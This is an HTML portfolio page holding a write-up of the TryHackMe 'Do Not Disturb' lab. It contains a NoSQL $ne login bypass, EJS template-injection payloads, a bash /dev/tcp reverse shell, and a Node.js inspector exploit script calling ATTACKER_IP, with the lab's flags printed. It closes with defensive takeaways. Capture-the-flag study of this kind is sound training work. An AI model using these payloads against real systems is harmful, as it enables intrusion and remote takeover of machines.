@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Do Not Disturb (TryHackMe) - CTF Write-up</title>
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    
+    <!-- Styles -->
+    <link rel="stylesheet" href="../css/style.css">
+    
+    <style>
+        .writeup-container {
+            max-width: 800px;
+            margin: 120px auto 50px auto;
+            padding: 40px;
+        }
+        h1, h2, h3 {
+            color: var(--primary-color, #00ffcc);
+            margin-top: 30px;
+            margin-bottom: 15px;
+        }
+        h1 {
+            font-size: 2rem;
+            margin-top: 0;
+        }
+        p {
+            margin-bottom: 15px;
+            line-height: 1.6;
+            color: var(--text-color, #ffffff);
+        }
+        ul {
+            margin-left: 20px;
+            margin-bottom: 20px;
+            color: var(--text-color, #ffffff);
+            line-height: 1.6;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        code {
+            background: rgba(0, 255, 204, 0.1);
+            color: var(--primary-color, #00ffcc);
+            padding: 3px 6px;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9em;
+        }
+        pre {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: var(--text-color, #ffffff);
+            line-height: 1.6;
+        }
+        blockquote {
+            border-left: 4px solid var(--primary-color, #00ffcc);
+            padding-left: 20px;
+            font-style: italic;
+            margin-bottom: 25px;
+            opacity: 0.8;
+            color: var(--text-color, #ffffff);
+        }
+        .flag-box {
+            background: rgba(0, 255, 204, 0.1);
+            border: 1px solid var(--primary-color, #00ffcc);
+            padding: 20px;
+            border-radius: 8px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.2rem;
+            color: var(--primary-color, #00ffcc);
+            text-align: center;
+            margin-top: 20px;
+            box-shadow: 0 0 15px rgba(0, 255, 204, 0.2);
+        }
+        .meta-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 30px;
+        }
+        .meta-table td {
+            padding: 10px 15px;
+            border-bottom: 1px solid var(--glass-border);
+            color: var(--text-color, #ffffff);
+        }
+        .meta-table td:first-child {
+            font-weight: 600;
+            color: var(--primary-color, #00ffcc);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            width: 140px;
+        }
+        .step-label {
+            display: inline-block;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--primary-color, #00ffcc);
+            background: var(--primary-glow);
+            padding: 4px 12px;
+            border-radius: 4px;
+            margin-bottom: 12px;
+        }
+        .denied-box {
+            background: rgba(255, 50, 50, 0.08);
+            border: 1px solid rgba(255, 50, 50, 0.3);
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: #ff6b6b;
+        }
+        .success-box {
+            background: rgba(0, 255, 150, 0.06);
+            border: 1px solid rgba(0, 255, 150, 0.25);
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: #69db7c;
+        }
+        .takeaway-card {
+            background: var(--card-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 15px;
+        }
+        .takeaway-card h4 {
+            color: var(--primary-color, #00ffcc);
+            margin-bottom: 8px;
+            font-size: 0.95rem;
+        }
+        .takeaway-card p {
+            margin-bottom: 0;
+            font-size: 0.9rem;
+            color: var(--text-muted);
+        }
+        .attack-chain {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            align-items: center;
+            margin-bottom: 25px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+        }
+        .chain-step {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            padding: 6px 12px;
+            border-radius: 4px;
+            background: rgba(0, 255, 204, 0.08);
+            border: 1px solid rgba(0, 255, 204, 0.2);
+            color: var(--primary-color, #00ffcc);
+        }
+        .chain-arrow {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+        .flag-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body class="dark-theme">
+    <header>
+        <nav id="navbar" style="background: rgba(10, 10, 10, 0.9); backdrop-filter: blur(10px);">
+            <div class="logo">OMAR</div>
+            <ul class="nav-links">
+                <li><a href="./">← All Write-ups</a></li>
+                <li><a href="../index.html" class="btn">Portfolio</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main class="writeup-container glass">
+        <h1>CTF Write-up: Do Not Disturb</h1>
+        
+        <table class="meta-table">
+            <tr><td>Event</td><td>Hacker Holidays · The Byte Lotus Hotel</td></tr>
+            <tr><td>Platform</td><td>TryHackMe</td></tr>
+            <tr><td>Category</td><td>🖥️ Boot2Root</td></tr>
+            <tr><td>Difficulty</td><td>Medium</td></tr>
+            <tr><td>Points</td><td>90</td></tr>
+            <tr><td>Tags</td><td>NoSQL Injection · SSTI · Reverse Shell · Node.js Inspector · Disk Group Privesc</td></tr>
+        </table>
+
+        <h2>Challenge Overview</h2>
+        <p><strong>Objective:</strong> Compromise the Byte Lotus poolside platform, escalate privileges through multiple service accounts, and recover both the user and root flags.</p>
+        <blockquote>
+            "Sign's on the door. Room's active. You have access you were never given, and so does he. The anomalies stop being anomalies: a session goes warm on a sunbed, and a stranger sits down in it, a wallet signs a transaction its owner didn't authorise, a shell on the beach answers back."
+        </blockquote>
+
+        <h3>Attack Chain</h3>
+        <div class="attack-chain">
+            <span class="chain-step">Nmap Scan</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">NoSQL Injection</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">SSTI (EJS)</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">Reverse Shell</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">🚩 User Flag</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">Node.js Inspector</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">Lateral Movement</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">Disk Group Privesc</span>
+            <span class="chain-arrow">→</span>
+            <span class="chain-step">🚩 Root Flag</span>
+        </div>
+
+        <h2>Methodology</h2>
+
+        <h3><span class="step-label">STEP 1</span> Reconnaissance</h3>
+        <p>I started with a targeted Nmap scan against the target to enumerate open ports and identify running services:</p>
+        <pre>nmap -Pn -sC -sV -oN nmap/initial 10.49.133.250</pre>
+        <ul>
+            <li><code>-Pn</code> — Skips host discovery (treats the host as online), useful since lab machines may not respond to ICMP pings.</li>
+            <li><code>-sC</code> — Runs Nmap's default NSE scripts for additional enumeration (banner grabbing, version fingerprinting, etc.).</li>
+            <li><code>-sV</code> — Probes open ports to determine the service and version running on each.</li>
+            <li><code>-oN nmap/initial</code> — Saves output in normal format for later reference.</li>
+        </ul>
+        <div class="success-box">
+            ✓ Scan revealed a web server running on the target.
+        </div>
+
+        <h3><span class="step-label">STEP 2</span> NoSQL Injection — Authentication Bypass</h3>
+        <p>Navigating to the web application, I found a login page. Rather than attempting to brute-force credentials, I tested for <strong>NoSQL injection</strong> on the login form. The application appeared to be backed by a NoSQL database (likely MongoDB), which is susceptible to operator injection when user input isn't properly sanitized.</p>
+        <p>I crafted a request using the <code>$ne</code> (not equal) operator against the password field. This effectively tells the database: <em>"log me in as <code>attendant</code> where the password is not equal to <code>x</code>"</em> — a condition that is almost always true:</p>
+        <pre>curl -i -s -c cookies.txt \
+  --data 'username=attendant&password[$ne]=x' \
+  http://10.49.133.250/login</pre>
+        <ul>
+            <li><code>-c cookies.txt</code> — Saves the session cookie returned by the server upon successful authentication.</li>
+            <li><code>password[$ne]=x</code> — The NoSQL injection payload. When parsed by a vulnerable backend (e.g., Express.js with body-parser), this becomes <code>{ password: { $ne: "x" } }</code>, bypassing the password check entirely.</li>
+        </ul>
+        <div class="success-box">
+            ✓ Authentication bypassed — valid session cookie obtained as the "attendant" user.
+        </div>
+
+        <h3><span class="step-label">STEP 3</span> Server-Side Template Injection (SSTI)</h3>
+        <p>With an authenticated session, I explored the application and discovered a template preview feature at <code>/staff/preview</code>. I tested it for <strong>Server-Side Template Injection (SSTI)</strong> by submitting a simple EJS arithmetic expression:</p>
+        <pre>curl -s -b cookies.txt \
+  --data-urlencode 'template=&lt;%=7*7%&gt;' \
+  http://10.49.133.250/staff/preview</pre>
+        <p>The server responded with <code>49</code>, confirming that user-supplied input is being rendered directly into a server-side EJS template engine without sanitization.</p>
+        <div class="success-box">
+            ✓ SSTI confirmed — server evaluated <%=7*7%> and returned 49.
+        </div>
+
+        <h3><span class="step-label">STEP 4</span> Remote Code Execution</h3>
+        <p>I escalated the SSTI to achieve <strong>Remote Code Execution (RCE)</strong> by leveraging Node.js's <code>child_process</code> module through the global process object:</p>
+        <pre>curl -s -b cookies.txt \
+  --data-urlencode 'template=&lt;%= global.process.mainModule.require("child_process").execSync("id").toString() %&gt;' \
+  http://10.49.133.250/staff/preview</pre>
+        <p>This payload chains through the Node.js runtime:</p>
+        <ul>
+            <li><code>global.process</code> — Accesses the Node.js runtime's process handle.</li>
+            <li><code>mainModule.require()</code> — Imports the <code>child_process</code> module.</li>
+            <li><code>execSync("id")</code> — Synchronously executes the <code>id</code> system command.</li>
+            <li><code>.toString()</code> — Converts the output buffer to a readable string.</li>
+        </ul>
+        <div class="success-box">
+            ✓ RCE confirmed — server returned the output of the id command.
+        </div>
+
+        <h3><span class="step-label">STEP 5</span> Reverse Shell — User Flag</h3>
+        <p>With confirmed RCE, I deployed a <strong>reverse shell</strong> to get an interactive session on the target. I set up a Netcat listener on my attacking machine:</p>
+        <pre>nc -lvnp 4444</pre>
+        <p>Then triggered the reverse shell through the SSTI vulnerability using a bash TCP redirect:</p>
+        <pre>curl -s -b cookies.txt \
+  --data-urlencode "template=&lt;%= global.process.mainModule.require('child_process').exec(\"bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1'\") %&gt;" \
+  http://10.49.133.250/staff/preview</pre>
+        <p>The payload spawns an interactive bash shell that redirects stdin, stdout, and stderr through a TCP connection back to my listener. I caught the connection and landed as the <code>poolside</code> service account:</p>
+        <pre>connect to [ATTACKER_IP] from (UNKNOWN) [10.49.133.250] 39568
+poolside@tryhackme-2404:/opt/poolside$ whoami
+poolside
+poolside@tryhackme-2404:/opt/poolside$ id
+uid=996(poolside) gid=996(poolside) groups=996(poolside)</pre>
+        <p>The user flag was located in the <code>poolside</code> user's home directory:</p>
+        <pre>cat /home/poolside/user.txt</pre>
+        <div class="flag-label">USER FLAG</div>
+        <div class="flag-box">
+            🚩 THM{w4rm_s3ss10n_h1j4ck3d}
+        </div>
+
+        <h3><span class="step-label">STEP 6</span> Lateral Movement — Node.js Inspector Debugger Abuse</h3>
+        <p>With a foothold as <code>poolside</code>, I began enumerating for privilege escalation vectors. I checked for internal services listening on localhost:</p>
+        <pre>ss -tlnp | grep 9229
+LISTEN 0  511  127.0.0.1:9229  0.0.0.0:*</pre>
+        <p>Port <strong>9229</strong> is the default port for the <strong>Node.js Inspector/Debugger protocol</strong>. I confirmed this by examining the running processes:</p>
+        <pre>ps -ef | grep inspect
+pipelinesvc  602  1  0 00:44 ?  00:00:00 /usr/bin/node --inspect=127.0.0.1:9229 processor.js</pre>
+        <p>A second service account — <code>pipelinesvc</code> — was running a Node.js application with the <code>--inspect</code> flag enabled, exposing a Chrome DevTools debugging interface on localhost. This debugger allows <strong>arbitrary JavaScript evaluation</strong> in the context of the running process, effectively granting RCE as the <code>pipelinesvc</code> user.</p>
+        <p>I queried the debugger's JSON metadata endpoint to obtain the WebSocket URL:</p>
+        <pre>curl http://127.0.0.1:9229/json</pre>
+        <pre>[{
+  "description": "node.js instance",
+  "id": "d56796e3-1fde-4b51-b760-eeaa74afa55c",
+  "title": "processor.js",
+  "type": "node",
+  "url": "file:///opt/pipelinesvc/telemetry/processor.js",
+  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/d56796e3-..."
+}]</pre>
+        <p>I then wrote an exploit script on the target that connects to the debugger via WebSocket and uses the <strong>Chrome DevTools Protocol</strong> <code>Runtime.evaluate</code> method to execute a reverse shell in the context of the <code>pipelinesvc</code> process:</p>
+        <pre>cat > /tmp/pwn.js &lt;&lt; 'EOF'
+(async()=>{
+  const t = await (await fetch("http://127.0.0.1:9229/json")).json();
+  const ws = new WebSocket(
+    t.find(x => x.webSocketDebuggerUrl).webSocketDebuggerUrl
+  );
+  const expr = `(function(){
+    var n = process.mainModule.require("net"),
+        c = process.mainModule.require("child_process"),
+        s = c.spawn("/bin/bash",[]),
+        k = new n.Socket();
+    k.connect(4445,"ATTACKER_IP",function(){
+      k.pipe(s.stdin);
+      s.stdout.pipe(k);
+      s.stderr.pipe(k);
+    });
+  })()`;
+  ws.onopen = () => ws.send(JSON.stringify({
+    id: 1,
+    method: "Runtime.evaluate",
+    params: { expression: expr }
+  }));
+  ws.onmessage = m => console.log(m.data);
+})();
+EOF
+
+node /tmp/pwn.js</pre>
+        <p>On my second Netcat listener (<code>nc -lvnp 4445</code>), I caught the connection as <code>pipelinesvc</code>:</p>
+        <pre>connect to [ATTACKER_IP] from (UNKNOWN) [10.49.133.250] 49840
+whoami
+pipelinesvc
+id
+uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)</pre>
+        <div class="success-box">
+            ✓ Lateral movement successful — now running as pipelinesvc with disk group membership.
+        </div>
+
+        <h3><span class="step-label">STEP 7</span> Privilege Escalation — Raw Disk Access</h3>
+        <p>The critical finding in the <code>id</code> output was that <code>pipelinesvc</code> is a member of the <strong><code>disk</code> group</strong> (gid=6). This group grants <strong>raw read/write access to block devices</strong>, effectively allowing direct filesystem access that bypasses <em>all</em> file permission controls — including reading files owned by root.</p>
+        <p>I identified the root filesystem's underlying block device:</p>
+        <pre>findmnt -no SOURCE /
+/dev/nvme0n1p1</pre>
+        <p>Then I used <strong><code>debugfs</code></strong> — an ext2/ext3/ext4 filesystem debugger — to read the root flag directly from the raw block device, completely bypassing file-level permissions:</p>
+        <pre>debugfs -R "cat /root/root.txt" /dev/nvme0n1p1</pre>
+        <div class="flag-label">ROOT FLAG</div>
+        <div class="flag-box">
+            🚩 THM{r4w_d1sk_4cc3ss_w4s_t00_much}
+        </div>
+
+        <h2>Key Takeaways</h2>
+
+        <div class="takeaway-card">
+            <h4>🔐 Sanitize NoSQL Queries</h4>
+            <p>Never pass raw user input into database queries. Use parameterized queries or explicit type checking to prevent operator injection like <code>$ne</code>, <code>$gt</code>, and <code>$regex</code>. Libraries like <code>mongo-sanitize</code> can strip dollar-sign operators from user input.</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>🛑 Never Render User Input in Templates</h4>
+            <p>Template engines should only process trusted, developer-defined templates. Allowing user-supplied content to be evaluated by an EJS, Jinja2, or similar engine leads directly to SSTI and full Remote Code Execution.</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>🐛 Disable Debugger Interfaces in Production</h4>
+            <p>The Node.js <code>--inspect</code> flag should never be enabled on production or internet-facing systems. It provides unauthenticated code execution via the Chrome DevTools Protocol. Even when bound to localhost, any user on the same machine with network access can exploit it for lateral movement.</p>
+        </div>
+
+        <div class="takeaway-card">
+            <h4>👥 Audit Group Memberships</h4>
+            <p>The <code>disk</code> group grants raw block device access, which is equivalent to root-level file read/write. Service accounts should never be members of privileged groups like <code>disk</code>, <code>adm</code>, or <code>docker</code> unless absolutely necessary and carefully justified.</p>
+        </div>
+    </main>
+</body>
+</html>
